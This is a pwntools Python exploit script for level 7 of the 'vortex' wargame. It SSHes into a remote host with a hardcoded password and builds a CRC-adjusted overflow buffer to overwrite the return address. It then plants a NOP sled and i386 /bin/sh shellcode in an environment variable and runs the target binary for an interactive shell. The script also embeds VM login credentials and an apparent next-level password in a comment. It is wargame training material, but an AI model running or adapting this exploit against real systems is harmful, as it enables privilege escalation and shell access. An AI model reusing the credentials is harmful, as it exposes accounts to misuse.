from pwn import *



env_adr = 0xffffdcf1
# buf_adr = 0xffffdd72
# ret_adr_location = 0xffffcf0c
off_until_ret_adr = 74

local_dir = None
remote_binary = None
local_binary = None
local_libc = None
libc = None
port = None
elf = None

BINARY_PATH = None
CWD = None
VM = None

def pad(s, slen):
    return s+b"B"*(slen-len(s))

def connect(level, password):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global CWD
    global BINARY_PATH
    global VM
    global env_adr
    compose_downloaded_files(level)
    port = 2228
    s = ssh("vortex"+level, "176.9.9.172", password=password, cache=True, port=port)
    s.libs(remote_binary, local_dir)
    log.info(f"cloned_binary: {local_binary}")
    elf = ELF(local_binary)
    libc = ELF(local_libc)
    context.clear()
    context.binary = local_binary
    context.log_file = "/tmp/docgillog"
    VM = False
    CWD = "/tmp/"
    BINARY_PATH = "/vortex/vortex"+level
    return s


# function of local testing vm
def connect_to_vm(level, password, remote=True):
    global CWD
    global VM
    global BINARY_PATH
    global ALIGNMENT_OFF
    if remote:
        connect(level, password)
    else:
        compose_downloaded_files(level)
    context.clear()
    context.binary = local_binary
    context.log_file = "/tmp/docgillog"
    s = ssh("gil", "192.168.2.177", password="gil123", cache=True)
    CWD = "/vortex/6/"
    BINARY_PATH = "/vortex/vortex" + level
    # BINARY_PATH = "/vortex/6/dir/vortex6"
    # BINARY_PATH = "dir/vortex6"
    s.upload(local_binary, BINARY_PATH)
    s.process(["chmod", "a+x", BINARY_PATH])
    VM = True
    return s
    # only useful to replace libc, if we need gadgets from it, then upload and use LD_PRELOAD
    # s.upload(local_libc, "/lib/x86_64-linux-gnu/libc.so.6")


def compose_downloaded_files(level):
    global remote_binary
    global local_dir
    global local_binary
    global port
    global libc
    global elf
    global local_libc
    local_dir = "/home/kali/PycharmProjects/vortex/" + level
    remote_binary = "/vortex/vortex" + level
    local_binary = local_dir + remote_binary
    local_libc = local_dir + "/lib32/libc.so.6"

def replace_char_at_index(org_str, index, replacement):
    ''' Replace character at index in string org_str with the
    given replacement character.'''
    new_str = org_str
    if index < len(org_str):
        new_str = org_str[0:index] + replacement + org_str[index + len(replacement):]
    return new_str

s = connect("7", "Y52jxHtt/")
# s = connect_to_vm("7", "Y52jxHtt/", remote=False)

reverse_script_binary_path = "./7/vortex7-rev/cmake-build-debug/vortex7_rev"

if not VM:
    io = s.process(["id", "-u", "vortex8"])
    vortex8_uid = int(io.recvall().decode("utf-8"))
    log.info(f"vortex8_uid: {vortex8_uid}")

log.info("############################################################################################################################################################")
log.info("# CREATE BUFFER")
log.info("############################################################################################################################################################")

buf = b""
buf = pad(buf, 128)
# overwrite ret pointer (hopefully)
buf = replace_char_at_index(buf, 66, pack(env_adr+250, 32))
buf = replace_char_at_index(buf, 70, pack(env_adr+250, 32))
buf = replace_char_at_index(buf, 74, pack(env_adr+250, 32))

# writes result into tmp docgil
process([reverse_script_binary_path, buf]).recvall()

crc_adjusted_buf = read("/tmp/docgil")
log.info(f"crc_adjusted_buf: {crc_adjusted_buf}")
log.info(f"buf len: {len(crc_adjusted_buf)}")

write("/tmp/gilbuf", crc_adjusted_buf)


s.upload("/tmp/gilbuf", "/tmp/gilbuf")




log.info("############################################################################################################################################################")
log.info("# CREATE ENV PAYLOAD")
log.info("############################################################################################################################################################")


payload = b""
payload += asm(pwnlib.shellcraft.i386.nop()) * 500
payload += asm(pwnlib.shellcraft.i386.sh())
log.info(f"payload: {payload}")
log.info(f"payload len: {len(payload)}")


env_payload = {"GIL": payload}

write("/tmp/gilpayload", payload)
s.upload("/tmp/gilpayload", "/tmp/gilpayload")

log.info("############################################################################################################################################################")
log.info("# EXECUTE EXPLOIT")
log.info("############################################################################################################################################################")


io = s.process([BINARY_PATH, crc_adjusted_buf], env=env_payload)
io.interactive()


# X70A_gcgl
